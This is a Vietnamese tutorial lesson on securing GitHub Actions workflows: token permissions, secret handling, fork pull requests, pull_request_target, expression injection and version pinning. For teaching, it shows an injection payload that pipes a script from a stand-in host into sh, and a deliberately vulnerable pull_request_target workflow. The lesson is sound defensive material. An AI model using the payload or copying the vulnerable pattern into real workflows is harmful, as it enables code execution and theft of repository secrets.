---
uid: f17d46f4-188b-440e-a39c-cde5ac711758
slug: workflow-security
title: "Workflow an toàn"
estimatedMinutes: 35
objectives:
  - "Cấp permissions tối thiểu cho GITHUB_TOKEN ở cấp workflow và cấp job"
  - "Không để secret lộ ra log"
  - "Giải thích vì sao PR từ fork không có secret, và rủi ro của pull_request_target"
  - "Tránh chèn dữ liệu người dùng thẳng vào lệnh run"
prerequisites:
  - actions-docker/actions-docker/push-to-ghcr
authors: [github:TienNHM]
---

# Workflow an toàn

Workflow chạy code với quyền ghi lên repo, lên GHCR, lên GitHub Pages. Kẻ xấu chiếm được workflow là chiếm được những quyền đó. Bài này gom các quy tắc bạn đã dùng trong chương 2 và 7, và giải thích vì sao.

## 1. Permissions tối thiểu

`GITHUB_TOKEN` có những quyền ghi trong `permissions`. Quy tắc: **cấp workflow chỉ đọc, job nào cần gì thì tự xin**.

```yaml
permissions:
  contents: read          # mọi job: chỉ đọc code

jobs:
  test:                   # không xin thêm: chỉ đọc
    runs-on: ubuntu-latest
    steps:
      - run: echo "chỉ cần đọc code"

  push-image:
    runs-on: ubuntu-latest
    permissions:          # thay hẳn quyền cấp workflow cho job này
      contents: read
      packages: write
    steps:
      - run: echo "được ghi lên GHCR"
```

Khi job ghi `permissions`, nó **thay hẳn** quyền cấp workflow chứ không cộng thêm, nên phải ghi lại `contents: read` nếu job còn cần checkout. Quyền nào không ghi là `none`.

Không ghi `permissions` ở đâu cả thì token nhận quyền mặc định của repo hoặc organization, có thể là quyền ghi rộng. Luôn ghi rõ.

## 2. Không in secret ra log

GitHub tự che giá trị của secret trong log thành `***`. Nhưng nó chỉ nhận ra **đúng chuỗi đó**. Biến đổi đi một chút là lọt:

```yaml
      # ĐỪNG làm thế này
      - run: echo "${{ secrets.DEPLOY_TOKEN }}" | base64
```

Quy tắc:

- Đưa secret vào step qua `env:`, lệnh chỉ đọc biến (như chương 5 track Discord). Không bao giờ `echo` secret, kể cả "để kiểm tra".
- Không bật `set -x` ở step có secret: nó in từng lệnh kèm giá trị biến.
- Ở chương 7, `GITHUB_TOKEN` chỉ được truyền vào `docker/login-action`, không đi qua lệnh shell nào.
- Lỡ lộ thì coi như mất: thu hồi và tạo secret mới, xóa log không giải quyết được (người khác có thể đã đọc).

## 3. Pull request từ fork

Ai cũng có thể fork repo public của bạn, sửa workflow hay `Dockerfile` thành bất cứ thứ gì, rồi mở pull request. Với event `pull_request` từ fork, GitHub tự bảo vệ bạn:

- workflow **không nhận** secret của repo bạn;
- `GITHUB_TOKEN` **chỉ có quyền đọc**, dù workflow xin `packages: write`.

Vì vậy job `push-image` có `if: github.event_name == 'push'`: trên PR nó không push được, và cũng không nên push.

## 4. Cẩn thận với `pull_request_target`

`pull_request_target` cũng chạy khi có PR, nhưng chạy **phiên bản workflow trên nhánh chính của bạn**, với **secret và token có quyền ghi**. Nó tồn tại cho những việc như tự gắn label cho PR, không cần chạy code của PR.

Nguy hiểm xuất hiện khi kết hợp nó với việc checkout và chạy code của PR:

```yaml
# NGUY HIỂM: đừng chép đoạn này
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # code của người lạ
      - run: docker build .                              # chạy code đó, có secret trong tay
```

Người mở PR chỉ cần sửa `Dockerfile` (một `RUN` gửi biến môi trường đi đâu đó) là lấy được token có quyền ghi của bạn. Đây là lỗi có thật, đã làm lộ secret của nhiều dự án mã nguồn mở.

**Quy tắc cho track này:** dùng `pull_request` để kiểm tra PR. Không dùng `pull_request_target`.

## 5. Không chèn dữ liệu người dùng vào `run`

Tiêu đề PR, tên nhánh, nội dung issue là chữ do **người khác** gõ. `${{ }}` được thay vào lệnh **trước khi** shell chạy, nên một tiêu đề PR như `"; curl http://evil.example/x.sh | sh; echo "` sẽ thành lệnh thật:

```yaml
      # ĐỪNG
      - run: echo "PR: ${{ github.event.pull_request.title }}"
```

Đưa qua biến môi trường thì shell coi nó là chữ, không phải lệnh:

```yaml
      # NÊN
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "PR: $PR_TITLE"
```

Biểu thức như `${{ github.repository }}`, `${{ github.sha }}` do GitHub đặt, không ai sửa được, nên dùng thẳng trong `run` như chương 1 là an toàn.

## 6. Ghim phiên bản action

`uses: owner/action@v4` lấy **tag** `v4`, và chủ action có thể dời tag đó sang code khác. Track này dùng tag phiên bản cho dễ đọc. Với action của bên thứ ba trong dự án quan trọng, có thể ghim bằng **commit SHA đầy đủ** (40 ký tự), kèm chú thích phiên bản:

```yaml
      - uses: owner/some-action@<sha-40-ký-tự>   # v1.2.3
```

Để không phải tự theo dõi bản mới, bật **Dependabot**: tạo `.github/dependabot.yml`, nó tự mở PR khi action hoặc image nền trong `Dockerfile` có bản mới:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: docker
    directory: /
    schedule:
      interval: weekly
```

## Danh sách tự kiểm tra

- [ ] `permissions: contents: read` ở cấp workflow; job nào cần ghi thì tự xin.
- [ ] Không có `echo` secret, không `set -x` ở step có secret.
- [ ] Không dùng `pull_request_target`.
- [ ] Job push/deploy có điều kiện `if`, không chạy trên pull request.
- [ ] Dữ liệu từ PR, issue đi qua `env:`, không chèn thẳng vào `run`.
- [ ] Mọi action và image đều ghi phiên bản.

## Tóm tắt

- Token chỉ nên có đúng quyền cần dùng, xin ở cấp job.
- Secret chỉ đi qua `env:` hoặc input của action; không in, không biến đổi rồi in.
- PR từ fork không có secret và quyền ghi; `pull_request_target` thì có, nên đừng chạy code của PR trong đó.
